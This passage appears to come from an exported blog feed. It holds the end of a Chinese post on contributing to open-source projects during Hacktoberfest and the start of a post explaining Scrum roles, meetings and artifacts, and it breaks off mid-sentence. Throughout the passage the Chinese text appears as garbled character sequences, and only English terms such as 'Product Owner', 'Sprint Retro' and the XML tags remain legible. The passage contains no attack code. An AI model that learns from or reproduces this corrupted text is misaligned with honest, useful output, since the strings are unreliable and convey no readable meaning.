é€šå¸¸åœ¨å°ˆæ¡ˆè£¡é¢éƒ½æœƒæœ‰ä¸€ä»½ CONTRIBUTING.mdï¼Œæƒ³è¦è²¢ç»ä»¥å‰è¨˜å¾—ä»”ç´°é–±è®€ï¼è£¡é¢æœƒèªªæ˜è©³ç´°çš„æµç¨‹ï¼Œä¸€èˆ¬ä¾†èªªï¼Œæµç¨‹å¤§è‡´ä¸Šéƒ½æœƒé•·é€™æ¨£ï¼š

æ‰¾åˆ° issueï¼Œç¢ºèªæ²’æœ‰å…¶ä»–äººè·Ÿä½ åŒæ™‚åœ¨åšï¼ˆæœƒæœ‰ label é¡¯ç¤ºï¼Œé€šå¸¸æ²’äººåœ¨è™•ç†çš„æœƒå¯« up for grabsï¼Œæœ‰äººåœ¨åšçš„æœƒå¯« in progressï¼‰ï¼Œä¸¦ä¸”åœ¨åº•ä¸‹èªªæ˜ä½ æƒ³è¦è§£é€™å€‹ issueã€‚
å¾—åˆ°åŒæ„ä»¥å¾Œï¼Œä½ å°±å¯ä»¥é–‹å§‹è§£é€™å€‹ issue äº†ï¼Œé€™ issue çš„æ¨™ç±¤ä¹Ÿæœƒè®Šæ›´æˆ in progressï¼Œæœ‰äº›å°ˆæ¡ˆæœƒè¦æ±‚æŠŠé€™å€‹å°ˆæ¡ˆ assign çµ¦è‡ªå·±ã€‚
fork é€™å€‹å°ˆæ¡ˆåˆ°è‡ªå·±çš„å¸³è™Ÿåº•ä¸‹
åœ¨ä½ çš„é›»è…¦ä¸ŠæŠŠ fork å¥½çš„å°ˆæ¡ˆ clone ä¸‹ä¾†
æŸ¥çœ‹å°ˆæ¡ˆè£¡é¢çš„è²¢ç»æŒ‡å—ï¼ˆä¸€èˆ¬éƒ½æ˜¯ CONTRIBUTING.mdï¼‰ï¼Œè£¡é¢æœƒæœ‰è©³ç´°çš„æµç¨‹ï¼Œå¯åƒè€ƒæˆ‘ä¸‹é¢çš„èªªæ˜
æ–°é–‹ä¸€å€‹ branchï¼ˆCONTRIBUTING.md è£¡é¢é€šå¸¸æœƒæç¤ºä½  branch åç¨±æ‡‰è©²å–ä»€éº¼ï¼Œæœ‰çš„æœƒå– issue çš„ç·¨è™Ÿï¼Œæœ‰çš„æœƒå–å« devï¼Œæ¯å€‹å°ˆæ¡ˆéƒ½ä¸åŒï¼‰
è¨­å®šå¥½æœ¬æ©Ÿçš„ç’°å¢ƒï¼Œé †åˆ©è®“å°ˆæ¡ˆåŸ·è¡Œï¼Œä¸¦ä¸”è·‘æ¸¬è©¦ï¼ˆä½ æœƒåœ¨ CONTRIBUTING.md è£¡é¢çœ‹åˆ°å¦‚ä½•è¨­å®šç’°å¢ƒï¼‰
é–‹å§‹è§£ issue å›‰ï¼

å¯æ˜¯ï¼Œå¦‚æœä½ ç¨‹å¼æ²’é‚£éº¼å¼·ï¼Œæ˜¯ä¸æ˜¯å°±æ²’è¾¦æ³•è²¢ç»äº†å‘¢ï¼Ÿ
ä¸æ˜¯çš„ï¼æœ‰äº› issue æœƒç‰¹åˆ¥æ¨™æ˜æ˜¯å°ˆé–€çµ¦æ–°æ‰‹çš„ï¼Œé©åˆç¬¬ä¸€æ¬¡ contribute çš„äººï¼å°±ç®—ä½ é‚„æ˜¯è¦ºå¾—é€™äº› issue å¤ªé›£ï¼Œæœ‰äº› issue èˆ‡ç¨‹å¼ç„¡é—œï¼Œå¯èƒ½åªæ˜¯å¹«å¿™å¯«ä¸€äº›æ–‡ä»¶ä¹‹é¡çš„ã€‚
åœ¨è§£å®Œ issue ä»¥å¾Œï¼Œæ¥è‘—å°±æ˜¯ç™¼ PR äº†ã€‚ä½†æ˜¯åœ¨ç™¼ PR ä¹‹å‰ï¼Œè«‹å‹™å¿…ç¢ºä¿è‡ªå·±æ”¹éä»¥å¾Œçš„ code æœ‰é€šéæ¸¬è©¦ã€‚å› ç‚ºä½ é€ PR ä¸Šå»ä»¥å¾Œï¼Œé€šå¸¸ä¹Ÿæœƒå†è·‘ä¸€éæ¸¬è©¦ï¼Œè‡ªå·±å…ˆåœ¨æœ¬æ©Ÿæ¸¬éï¼Œå¯ä»¥çœæ‰å¾ˆå¤šæ™‚é–“ï¼Œä¹Ÿæ¸›å°‘è¦å¹«ä½  review çš„äººçš„éº»ç…©ã€‚
ç¢ºèªæ¸¬è©¦é€šéä»¥å¾Œï¼Œå°±å¯ä»¥é€ PR äº†ã€‚
åœ¨é€ PR çš„æ™‚å€™ï¼Œå…§æ–‡è·Ÿæ¨™é¡Œé€šå¸¸ä¹Ÿæœƒæœ‰ä¸€å®šçš„è¦ç¯„ï¼Œä¾‹å¦‚èªªè¦æåˆ°ä½ è§£äº†å“ªä¸€å€‹ issueï¼Œç”¨ä»€éº¼æ–¹æ³•å»è§£çš„ç­‰ç­‰ï¼Œç¸½ä¹‹å°±æ˜¯å¤§æ¦‚èªªæ˜ä¸€ä¸‹å³å¯ã€‚
æœ€å¾Œï¼Œå°±ç­‰å°ˆæ¡ˆçš„ä½œè€…å€‘æœ‰æ™‚é–“çš„æ™‚å€™æœƒä¾†å¯©æ ¸ï¼Œå¯©æ ¸é€šéä»¥å¾Œï¼Œä½ å°±æ­£å¼å°é€™å€‹å°ˆæ¡ˆç”¢ç”Ÿè²¢ç»äº†ã€‚
çµè«–æœ‰æ¨™ä¸Š hacktoberfest æ¨™ç±¤çš„ issue å¯ä»¥å…ˆå˜—è©¦è§£è§£çœ‹ï¼Œæˆ–æ˜¯å¾æ´»å‹•ç¶²ç«™ä¸Šé¢æ¨è–¦çš„å°ˆæ¡ˆé–‹å§‹ä¸‹æ‰‹ã€‚
æ¯”è¼ƒå¤§çš„å°ˆæ¡ˆçš„å¥½è™•å°±æ˜¯æ–‡ä»¶å¾ˆå®Œæ•´ï¼ŒæŠŠæ¯ä¸€å€‹æ­¥é©Ÿéƒ½å¯«å¾—å¾ˆæ¸…æ¥šï¼Œè®“ä½ ä¸æœƒä¸çŸ¥æ‰€æªã€‚
å¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£æ˜¯å¯« JavaScriptï¼Œæ¨è–¦ä½  Telescope é€™å€‹å°ˆæ¡ˆï¼Œè£¡é¢æ¯ä¸€å€‹ issue éƒ½å¯«å¾—å¾ˆæ¸…æ¥šè¦åšä»€éº¼ï¼Œcontribute çš„æ–‡ä»¶ä¹Ÿéå¸¸é½Šå…¨ï¼Œæœ‰äº›ç”šè‡³é‚„æœƒé™„æç¤ºå‘¢ï¼
å¸Œæœ›å¤§å®¶è¶è‘—é€™å€‹æ´»å‹•å¯ä»¥å˜—è©¦çœ‹çœ‹é€ PRã€æ‹¿è¡£æœï¼Œå¦‚æœæ²’æœ‰æ‹¿åˆ°ä¹Ÿä¸ç”¨å¤ªå‚·å¿ƒï¼Œè‡³å°‘ä½ å°é–‹æºçš„ä¸–ç•Œæœ‰äº†æ›´é€²ä¸€æ­¥çš„ç­è§£ï¼Œä¹Ÿæ˜¯ç²ç›Šè‰¯å¤šäº†ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>github</tag>
        <tag>hacktoberfest</tag>
        <tag>open_source</tag>
      </tags>
  </entry>
  <entry>
    <title>ç•¶ä¸€å€‹ Scrum Master æ˜¯ä¸€å€‹æ€æ¨£çš„é«”é©—ï¼Ÿ</title>
    <url>/2019/01/05/hello-i-am-a-scrum-master/</url>
    <content><![CDATA[
å‰è¨€Scrum æ˜¯ä¸€å€‹ä»¥åœ˜éšŠç‚ºåŸºç¤ä¾†é–‹ç™¼è¤‡é›œç³»çµ±å’Œç”¢å“çš„æ•æ·é–‹ç™¼æ¡†æ¶å’Œæ–¹æ³•è«–ã€‚ç›¸ä¿¡å¾ˆå¤šè»Ÿé«”é–‹ç™¼äººå“¡éƒ½è½é Scrumï¼Œè€Œä¸”ä¹ŸæŠŠå®ƒé‹ç”¨åœ¨ç”¢å“é–‹ç™¼ä¸­ï¼Œç„¶è€Œæ¯å€‹åœ˜éšŠåœ¨ä½¿ç”¨ Scrum æ™‚éƒ½æœƒé‡åˆ°ä¸åŒçš„å•é¡Œï¼Œæœ‰äº›æ˜¯å…±é€šæ€§çš„å•é¡Œï¼Œæœ‰äº›æ˜¯å€‹åˆ¥åœ˜éšŠæ‰€é‡åˆ°çš„å•é¡Œã€‚éå»ä¸€æ®µæ™‚é–“åœ¨ç­†è€…çš„è·æ¥­ç”Ÿæ¶¯ä¸­å› ç·£éš›æœƒåœ°ç¶“æ­·äº†é–‹ç™¼è€…ã€ç”¢å“è² è²¬äººä»¥åŠ Scrum Master ç­‰è§’è‰²ï¼Œå°æ–¼ä¸åŒè§’è‰²çš„ç‰¹æ€§å’Œæ‰€æ‡‰å…·å‚™çš„ç‰¹è³ªå’Œèƒ½åŠ›ä»¥åŠ Scrum çš„èƒ½èˆ‡ä¸èƒ½éƒ½æœ‰äº›è¨±çš„èªè­˜ã€‚æ¥ä¸‹ä¾†ï¼Œæœ¬æ–‡å°‡é€éä¸€å€‹ Scrum Master è¦–è§’å»æ¢è¨ Scrum Master åœ¨ Scrum Team ä¸­æ‰€æ‰®æ¼”çš„è§’è‰²å’Œå¯èƒ½é‡åˆ°çš„æŒ‘æˆ°å’Œæ©Ÿé‡ã€‚

Scrum å…ˆä¿®èª²ï¼šé—œæ–¼ Scrum ä½ å¿…é ˆå…ˆæ˜ç™½çš„å°ˆæœ‰åè©Role è§’è‰²
Product Owner è² è²¬è¦åŠƒç”¢å“ road mapï¼Œè² è²¬é‡æ¸…ä½¿ç”¨è€…å’Œ Stakeholder çš„éœ€æ±‚ä¸¦è½‰åŒ–æˆå…·æœ‰å•†æ¥­åƒ¹å€¼çš„ User Storyï¼Œä¸¦è©•ä¼° Story çš„å„ªå…ˆé †åºï¼Œæ±ºå®šå“ªäº›é …ç›®è¦å¾ Backlog é€²å…¥åˆ° sprint ç•¶ä¸­ã€‚æ­¤å¤–ï¼ŒProduct Owner ä¹Ÿå¿…é ˆå’Œ Dev Team æˆå“¡è¨è«–å‡º Story çš„ Acceptance criteria å’Œè² è²¬é©—æ”¶æˆæœ

Scrum Master &#x2F; Agile Coach åˆç¨±æ•æ·æ•™ç·´ï¼Œè² è²¬å°å…¥ Scrum æµç¨‹ä¸¦åŸ¹é¤Šåœ˜éšŠæˆå“¡å…·å‚™ agile æ€ç¶­ã€‚Scrum Master è² è²¬ä¸»æŒ Scrum ç›¸é—œæœƒè­°èˆ‡ process å’Œå”åŠ©ç®¡ç†åˆ†æ Sprint ç”¢å‡ºç‰©ï¼Œæ­¤å¤–ä¹Ÿå¿…é ˆå”åŠ©æ•´å€‹æµç¨‹æŒçºŒæ”¹å–„ï¼Œæœ€çµ‚è®“åœ˜éšŠé”åˆ° process self-managed ç‹€æ…‹ã€‚ä¸€èˆ¬è€Œè¨€ï¼ŒScrum Master åœ¨åœ˜éšŠè£¡é€šå¸¸æ²’æœ‰å¯¦éš›ç®¡ç†æ¬Šä½†å¿…é ˆå”åŠ©å…¶ä»–æˆå“¡åœ¨é‡åˆ° block äº‹æƒ…æ™‚å»é™¤éšœç¤™ï¼Œæœ‰æ™‚ä¹Ÿè¦æ‰®æ¼”è¼”å°é•·çš„è§’è‰²æ¿€å‹µåœ˜éšŠå£«æ°£ã€‚ç°¡è¨€ä¹‹ï¼ŒScrum Master æ˜¯ä¸€å€‹å¿…é ˆå°æ–¼ç”¢å“é–‹ç™¼æµç¨‹ä»¥åŠæºé€šèƒ½åŠ›æœ‰ä¸€å®šæŒæ¡ä¸¦å…·å‚™ä¸€å®šçš„æŠ€è¡“å¯¦åŠ›çš„è§’è‰²ã€‚èªªçœŸçš„ï¼ŒçœŸæ­£è¦ç•¶çš„å¥½ Scrum Masterï¼Œä¸å®¹æ˜“

Development Team &#x2F; Dev Team å…·å‚™è·¨è·èƒ½çš„é–‹ç™¼åœ˜éšŠæˆå“¡ï¼ˆå¯ä»¥å®Œæˆ User Story çš„æ‰€æœ‰é–‹ç™¼å·¥ä½œï¼ŒåŒ…å«é–‹ç™¼ã€æ¸¬è©¦ç­‰ï¼‰ï¼Œä¸€èˆ¬éµå®ˆå…©å¡Š pizza åŸå‰‡ï¼Œä»¥ä¸è¶…é 6-8 äººç‚ºåŸå‰‡ã€‚åœ˜éšŠæˆå“¡å¿…é ˆå…·å‚™äº’åŠ©åˆä½œçš„é¨å£«ç²¾ç¥ï¼Œä»¥åœ˜éšŠç›®æ¨™ç‚ºç›®æ¨™ï¼Œåœ¨äº’ç›¸å”åŠ©çš„åŸºç¤ä¸‹ä¸€èµ·åœ¨ Sprint çµæŸå‰å®Œæˆæ–¼ Sprint é–‹å§‹æ™‚æ‰€æ‰¿è«¾æ‡‰è©²äº¤ä»˜çš„ä»»å‹™

Stakeholder åˆ©å®³é—œä¿‚äººï¼Œéœ€æ±‚çš„èµ·æºåœ°ã€‚åœ¨ç›´æ¥é¢å°æ¶ˆè²»è€…å¸‚å ´çš„ç”¢å“åœ˜éšŠå¯èƒ½æ˜¯ä¸€èˆ¬æ¶ˆè²»è€…ï¼Œè‹¥æ˜¯é–‹ç™¼å…§éƒ¨å·¥å…·æˆ–æ˜¯é¢å°ä¼æ¥­å¸‚å ´çš„ç”¢å“åœ˜éšŠï¼Œåˆ©å®³é—œä¿‚äººå¯èƒ½æœƒæ˜¯ AMï¼ˆå®¢æˆ¶ç¶“ç†ï¼‰ã€BDï¼ˆå•†å‹™æ‹“å±•ï¼‰ã€Tech Supportï¼ˆæŠ€è¡“æ”¯æ´ï¼‰ã€Marketingï¼ˆè¡ŒéŠ·ï¼‰ç­‰å–®ä½çš„åŒä»



Event æ´»å‹•
Sprint Sprint åœ¨æ©„æ¬–çƒä¸­ç‚ºè¡åˆºçš„æ„æ€ï¼ŒæŒ‡çš„æ˜¯ä¸€å€‹ Scrum çš„é€±æœŸã€‚é€šå¸¸ä»¥ 2-4 é€±ç‚ºä¸€å€‹å–®ä½ï¼Œç†è«–ä¸Šé™¤äº†ç·Šæ€¥ bug æˆ–æ˜¯ task å¤–ï¼Œä¸èƒ½æ–¼ Sprint é–‹å§‹å¾Œé¡å¤–æ–°å¢ Story é€²å…¥ Sprint ç•¶ä¸­

Sprint Planningï¼Œæœƒè­°æ™‚é–“ï¼š1-2 hours æ–¼ Sprint é–‹å§‹å‰èˆ‰è¾¦çš„æœƒè­°ã€‚æ ¹æ“š Product Owner çš„å„ªå…ˆé †åºå’Œåœ˜éšŠå¯ä»¥æ¶ˆè€—çš„é»æ•¸ï¼ˆvelocityï¼‰è©•ä¼°å“ªäº› Story éœ€è¦é€²å…¥åˆ° Sprint ç•¶ä¸­çš„æœƒè­°ã€‚ç”± Scrum Master ä¸»æŒï¼ŒProduct Owner å’Œ Dev Team åƒèˆ‡ï¼Œç”± Dev Team èªé ˜æƒ³è¦è² è²¬çš„ Storyï¼ŒDev Team æ–¼æœƒè­°çµæŸå¾Œæ ¹æ“š Story åŠƒåˆ†æˆæ›´ç´°éƒ¨çš„ taskï¼Œç„¶å¾Œ Scrum Master ç¢ºèªæ²’å•é¡Œå¾Œé–‹å§‹ Sprint çš„é€±æœŸ

Sprint Gromming (Backlog Refinement&#x2F;Stroy time)ï¼Œæœƒè­°æ™‚é–“ï¼šä¸€æ¬¡ 2-3 hours æˆ–åˆ†æˆå…©æ¬¡ï¼Œæ¯æ¬¡ 1-1.5 hours æ–¼ Sprint ä¸­é–“èˆ‰è¾¦çš„æœƒè­°ï¼Œä¸»è¦ç›®çš„åœ¨è©•ä¼°ä¸‹ä¸€å€‹ Sprint ä¸­è¦å¾ Backlog ä¸­æ‹¿å‡ºä¾†åšçš„ Story é»æ•¸çš„ä¼°è¨ˆï¼ˆPlanning pokerï¼‰ã€‚ä¸€èˆ¬é€é Product Owner èªªæ˜ User Story ç„¶å¾Œå’Œ Dev Team è¨è«–å®šç¾©å‡ºä»¥ User è§’åº¦è¡¨è¿°çš„ Acceptance criteriaã€‚è¨˜å¾—é€™é‚Šçš„ Story Point æ˜¯ç›¸å°å€¼ä¸¦ä¸æ˜¯å®Œå…¨ mapping åˆ°æ™‚é–“ï¼Œè€Œä¸”æ¯å€‹ team çš„ç‹€æ³éƒ½æœƒä¸ä¸€æ¨£ï¼Œä¸»è¦æ˜¯æ ¹æ“šä½ å€‘ team å°æ–¼é€™é … Story çš„ Complexityã€Uncertainty å’Œ Effort å»åšè©•ä¼°ï¼Œä¸€èˆ¬ä½¿ç”¨è²»å¼æ•¸åˆ—è¡¨ç¤ºï¼ˆ1ã€2ã€3ã€5ã€8ã€13ã€21â€¦ï¼‰ã€‚é€™å€‹æœƒè­°ååˆ†é‡è¦ï¼Œé€é Planning poker çš„éç¨‹å¯ä»¥è®“å¤§å®¶å°æ–¼ Story çš„èªçŸ¥å’ŒçŸ¥è­˜å¯ä»¥ align åˆ°åŒä¸€æ¢ç·šä¸Šï¼ˆä¾‹å¦‚ä¼°è¨ˆé»æ•¸ä¸ä¸€è‡´æ™‚å½¼æ­¤èªªæ˜å’Œè¨è«–ï¼Œå¢é€²å°æ–¼ Story å’Œç³»çµ±çš„äº†è§£ï¼‰ã€‚è¨˜å¾—ï¼Œè‹¥æ˜¯ User Story éå¤§ï¼Œæ²’è¾¦æ³•åœ¨ä¸€å€‹ Sprint å®Œæˆæœƒå»ºè­°æŠŠå®ƒåˆ‡æˆæ¯”è¼ƒå°çš„ Storyã€‚è‹¥æ˜¯é€£ Product Owner éƒ½æ²’è¾¦æ³•æè¿°å¾ˆæ¸…æ¥šçš„ User Story æœƒè¦æ±‚ Product Owner å…ˆå»é‡æ¸…éœ€æ±‚åœ¨ä¸‹ä¸€æ¬¡ Sprint Gromming æœƒè­°æˆ–æ˜¯ Sprint Planning å‰å†æ¬¡ repoint

Sprint Review (Sprint Demo)ï¼Œæœƒè­°æ™‚é–“ï¼šå…©æ¬¡ 30minsï¼ˆåˆ©å®³é—œä¿‚äºº&#x2F;å…§éƒ¨åœ˜éšŠï¼‰ åœ¨ Sprint Review ä¸­ï¼ŒScrum Master æœƒé‚€è«‹ Stakeholder åƒèˆ‡æœƒè­°ï¼Œç”± Scrum Master ç°¡ä»‹é€™æ¬¡ Sprint æ‰€å®Œæˆçš„ Shippable Product Incrementï¼ˆå¯äº¤ä»˜çš„ç”¢å“å¢é‡ï¼‰å’Œ Dev Team å±•ç¤ºé–‹ç™¼æˆæœã€‚è®“å¸‚å ´æ¥­å‹™ç«¯å’Œç³»çµ±é–‹ç™¼ç«¯å¯ä»¥å½¼æ­¤æºé€šä¸¦ç¢ºèªç”¢å“æ–¹å‘èˆ‡å¸‚å ´å»åˆï¼Œè‹¥æ˜¯æœ‰éœ€è¦ç”¢å“æ”¹å–„æˆ–æ˜¯æ–°çš„éœ€æ±‚ç”¢ç”Ÿå°‡ç”± Product Owner é‡æ¸…å¾Œæ”¾å…¥ Backlog ä¸­

Sprint Retrospectiveï¼ˆSprint Retroï¼‰ï¼Œæœƒè­°æ™‚é–“ï¼šä¸€æ¬¡ 1 hour Sprint Retro ç°¡è€Œè¨€ä¹‹å¼æ˜¯ Scrum team æ–¼ Sprint çµæŸæ™‚çš„é–‰é–€æœƒè­°ã€‚é€šå¸¸åœ¨é€éæ„Ÿè¬çš„å°è±¡ä¾†ç·©å’Œæ°£æ°›ï¼Œä¸¦æª¢è¨é€™æ¬¡ Sprint çš„æµç¨‹æ˜¯å¦æœ‰éœ€è¦æª¢è¨çš„éƒ¨ä»½æˆ–æ˜¯åšçš„ä¸éŒ¯çš„éƒ¨ä»½ï¼Œè‹¥æ˜¯æ²’æœ‰å®Œå…¨å®Œæˆæ‰€æ‰¿è«¾è¦å®Œæˆçš„äº‹æƒ…ï¼Œå¿…é ˆäº†è§£åŸå› ï¼ˆä¾‹å¦‚ä½ä¼°è¤‡é›œåº¦æˆ–æ˜¯ä¸­é–“æœ‰é‡åˆ° block å½±éŸ¿é–‹ç™¼ï¼‰ã€‚é€šå¸¸æœƒæ­é… Sprint Planning Doc å’Œ Burn down chart ä»¥åŠä¸Šæ¬¡çš„ Sprint Retrospective Doc åˆ—å‡ºçš„ todo item ä¾†é€²è¡Œæª¢è¨

Daily Scrum (Daily Standup Meeting) æ¯å¤©ç´„ 15 åˆ†é˜çš„ç«™ç«‹æœƒè­°ï¼Œæ¯ä½ Scrum team æ›´æ–°è‡ªå·±æ˜¨å¤©å®Œæˆçš„äº‹é …ã€ä»Šå¤©é è¨ˆå®Œæˆçš„äº‹é …ä»¥åŠæ˜¯å¦æœ‰é‡åˆ°ä»€éº¼ block é˜»ç¤™ã€‚è‹¥æ˜¯æœ‰ block å°‡ç”± Scrum Master æºé€šå”èª¿ä¸¦èª¿åº¦åœ˜éšŠè³‡æºå”åŠ©ç§»é™¤æˆå“¡éšœç¤™ã€‚è‹¥æ˜¯æœ‰ç„¡æ³•åœ¨ Sprint çµæŸå‰å®Œæˆçš„ Story ä¹Ÿè¦è®“ Product Owner ææ—©çŸ¥é“ã€‚å¦å¤–ï¼ŒBurn down ä¹Ÿæ˜¯éœ€è¦åœ¨ Daily Scrum å¤§å®¶è¦ä¸€èµ·è§€çœ‹ Sprint æ˜¯å¦æœ‰æ­£å¸¸é‹ä½œçš„æŒ‡æ¨™

User Stroy Mapping &#x2F; workshopï¼Œæœƒè­°æ™‚é–“ï¼šä¸€æ¬¡ 1.5-2 hours ä¸€èˆ¬ä¸èƒ½ç®—æ˜¯æ¨™æº–çš„ Sprint Eventï¼Œé€šå¸¸æ˜¯ Product Owner åœ¨å°æ–¼é–‹ç™¼æ–°ç”¢å“çš„æŒæ¡åº¦æ¯”è¼ƒä½ï¼Œéœ€è¦é–‹ç™¼æˆå“¡ä¸€èµ·å”åŠ©å®šç¾© User Story æ‰€å¬é–‹çš„æœƒè­°


Artifact ç”¢å‡ºç‰©
Backlog è£æœ‰å¾…å®Œæˆçš„ Story æˆ–æ˜¯ Bug çš„è¢‹å­ï¼Œåœ¨ Sprint Gromming æ™‚æ ¹æ“š Priority é€²è¡Œé»æ•¸ä¼°è¨ˆï¼Œæ–¼ Sprint Planning æ±ºå®šå“ªäº›å·²ä¼°è¨ˆ Story éœ€è¦é€²å…¥é€™æ¬¡çš„ Sprint ç•¶ä¸­

Sprint Planning Doc è¨˜éŒ„ç•¶æ¬¡ Sprint æ‰€æ‰¿è«¾è¦å®Œæˆçš„ Story å’Œéœ€è¦ä¿®å¾©çš„ Bugï¼ˆé€šå¸¸ç‚ºæ’å–®ç·Šæ€¥ Bug æˆ–æ˜¯ä¸ç·Šæ€¥ä½†æœ‰åœ¨ Gromming é€²è¡Œé»æ•¸ä¼°è¨ˆçš„ Storyï¼‰ï¼ŒDev Team æˆå“¡éœ€è¦å®šæœŸæ›´æ–°æ‰€è² è²¬çš„ Story çš„ç›¸é—œæ–‡ä»¶

Sprint Gromming Doc è¨˜éŒ„ç•¶æ¬¡ Sprint æ‰€æ‰¿è«¾è¦å®Œæˆçš„ Story &#x2F; Acceptance criteria å’Œéœ€è¦ä¿®å¾©çš„ Bug çš„é»æ•¸ä¼°è¨ˆã€‚

Sprint Retrospective Doc è¨˜éŒ„ Sprint æª¢è¨æœƒè­°ä¸­çš„å¾…è¾¦äº‹é …å’Œæª¢è¨äº‹é …

Burn down chart &#x2F; Burn up chart ä»¥åœ˜éšŠç‚ºå–®ä½ï¼Œè¨˜éŒ„ Sprint å®Œæˆç‹€æ³çš„åœ–è¡¨ï¼ŒBurn down chart è¨˜éŒ„é»æ•¸å®Œæˆä¸‹é™çš„è¶¨å‹¢ã€‚Burn up chart è¨˜éŒ„ç´¯ç©å®Œæˆçš„é»æ•¸å’Œ scope çš„è¶¨å‹¢
 

Scrum Board è¨˜éŒ„ Sprint éç¨‹ä¸­æ¯ä¸€å€‹ Story ä»¥åŠ Story ä¸‹ task çš„ç‹€æ³ï¼Œæ˜¯åœ¨ Todo é‚„æ˜¯ In Progress é‚„æ˜¯ Done
 

Definition of Doneï¼ˆDoDï¼‰ åœ˜éšŠå®šç¾©çš„é©—æ”¶æˆæœæ¨™æº–ï¼Œä¾‹å¦‚é–‹ç™¼ä¸€å€‹æ–°åŠŸèƒ½å¿…é ˆå«ï¼šDev + QA + Doc + Deploy æ‰ç®— Doneï¼Œæ˜¯æ¯ä¸€å€‹ Story éƒ½å¿…é ˆéµå®ˆçš„å®Œæˆæ¨™æº–

Epic &#x2F; Theme &#x2F; User Story &#x2F; Acceptance criteria User Story æ˜¯ç”¨ä½¿ç”¨è€…éœ€æ±‚è§’åº¦æ’°å¯«çš„æœ‰å•†æ¥­åƒ¹å€¼çš„ä¸€æ®µæ•˜è¿°ï¼Œè€Œ Acceptance criteria å‰‡æ˜¯æ›´ç‚ºç´°éƒ¨çš„è£œå……æè¿°ã€‚ç•¶æœ‰æ•¸å€‹ story éš¸å±¬æ–¼æŸä¸€å€‹ç›¸é—œ feature æ™‚é€šå¸¸æœƒæŠŠå®ƒæ­¸ç‚ºåŒä¸€å€‹ Themeï¼Œè‹¥æ˜¯ä¸€å€‹å¤§çš„ç”¢å“æˆ–æ˜¯ç³»çµ±éœ€è¦æ©«è·¨æ•¸å€‹ sprint æ™‚æœƒæŠŠé€™äº› Story éƒ½æ­¸é¡ç‚ºåŒä¸€å€‹ Epic
 # User Stroyæˆ‘æ˜¯ä¸€å€‹ç¶²ç«™ä½¿ç”¨è€…æˆ‘æƒ³è¦å¯ä»¥æäº¤ feedbacké€™æ¨£ç¶²ç«™é–‹ç™¼è€…å°±å¯ä»¥æ ¹æ“šä½¿ç”¨è€…çš„å›é¥‹å»å„ªåŒ–ç¶²ç«™# Acceptance criteriaç•¶ä½¿ç”¨è€…é»é¸å³ä¸‹è§’çš„åœ“é»æŒ‰éˆ•å¾Œï¼Œå¯ä»¥çœ‹åˆ°è¡¨å–®ï¼Œè¡¨å–®ä¸Šé¢æœ‰å§“åã€email å’Œå›é¥‹è¨Šæ¯ä¸‰å€‹æ¬„ä½ç•¶ä½¿ç”¨è€…å¡«å®Œè¡¨å–®é€å‡ºå¾Œè‹¥æˆåŠŸæœƒé–ƒå‡ºä¸€å€‹æäº¤æˆåŠŸçš„è¨Šæ¯ç•¶ä½¿ç”¨è€…è¡¨å–®é …ç›®æœ‰ç¼ºæ¼æ™‚æœƒæœ‰æç¤ºè¨Šæ¯æç¤º

é‚£äº›æ“”ä»» Scrum Master å­¸åˆ°çš„äº‹åœ¨äº†è§£ Scrum ç›¸é—œçš„å°ˆæœ‰åè©å¾Œæˆ‘å€‘å°±å¯ä»¥é–‹å§‹æˆ‘å€‘ Sprint å•¦ï¼ä½†äº‹å¯¦ä¸Šï¼ŒScrum åªæ˜¯ä¸€ç¨®æ¡†æ¶å’Œæ–¹æ³•è«–ï¼Œå¯¦éš›æˆ‘å€‘åœ¨åŸ·è¡Œ Scrum æ™‚å¾€å¾€æœƒå› ç‚ºåœ˜éšŠæˆå“¡çš„ä¸åŒæˆ–æ˜¯çµ„ç¹”æ–‡åŒ–çš„ä¸åŒè€Œç”¢ç”Ÿä¸åŒçš„æ•ˆæœã€‚æ¥è‘—è®“æˆ‘å€‘ä¾†çœ‹çœ‹å¯¦éš›ä¸Šåœ¨åŸ·è¡Œ Scrum æœƒæœ‰å“ªäº›éœ€è¦ç•™æ„çš„è§€å¿µ

åŸºç¤å»ºè¨­å’Œåœ˜éšŠç´ è³ªå¾ˆé‡è¦ CI&#x2F;CD åŸºç¤å»ºè¨­ã€DevOps æ–‡åŒ–ã€Agile ç²¾ç¥ã€åœ˜éšŠæ˜¯å¦å…·å‚™é–‹ç™¼ä¸Šæ‰€éœ€çš„æ‰€æœ‰æŠ€èƒ½ç­‰éƒ½æ˜¯ Scrum é‹ä½œèƒ½å¦é †æš¢å¾ˆé‡è¦çš„ä¸€ç’°ï¼Œè‹¥æ˜¯åŸºç¤å»ºè¨­ä¸ç©©ï¼Œå¾ˆå¤šæ™‚å€™æˆ‘å€‘çš„é»æ•¸ä¼°è¨ˆå¾€å¾€æœƒä½ä¼°ï¼Œé€ æˆ Sprint é‹ä½œä¸Šçš„å›°é›£ã€‚å¦å¤–è‹¥æ˜¯åœ˜éšŠæˆå“¡éƒ½å…·å‚™ T å‹äººæ‰çš„èƒ½åŠ›ä¹Ÿå°‡è®“ Scrum é‹ä½œæ›´é †æš¢

æˆ‘å€‘æ˜¯ä¸€å€‹è·æ¥­çƒéšŠ Sprint æ˜¯ä»¥åœ˜éšŠç‚ºåŸºç¤ï¼ŒBurn down chart ä¸æ˜¯ä¸€å€‹äººçš„ Burn down chartï¼Œæ‰€ä»¥è‹¥æ˜¯æœ‰åœ˜éšŠå¤¥ä¼´é‡åˆ°å›°é›£æ˜¯éœ€è¦å…¶ä»–å¤¥ä¼´å”åŠ©ï¼ˆä¾‹å¦‚ï¼šå°æ–¼ç³»çµ±æ¶æ§‹ä¸ç†Ÿæ‚‰ï¼‰ï¼Œå…¶ä»–æ¯”è¼ƒç†Ÿæ‚‰çš„å¤¥ä¼´æ‡‰è©²ä¸»å‹•çµ¦äºˆå”åŠ©ã€‚è‹¥æ˜¯æœ‰å¤¥ä¼´ç„¡æ³•å¦‚æœŸå®Œæˆä»»å‹™ï¼Œå…¶ä»–è‹¥æœ‰å¤¥ä¼´å·²ç¶“å®Œæˆæ‰‹ä¸Šçš„äº‹æƒ…ï¼Œä¹Ÿå¯ä»¥ä¸»å‹•å”åŠ©ä¸€èµ·å®Œæˆå‰©ä¸‹çš„å·¥ä½œï¼Œç¢ºä¿ Sprint 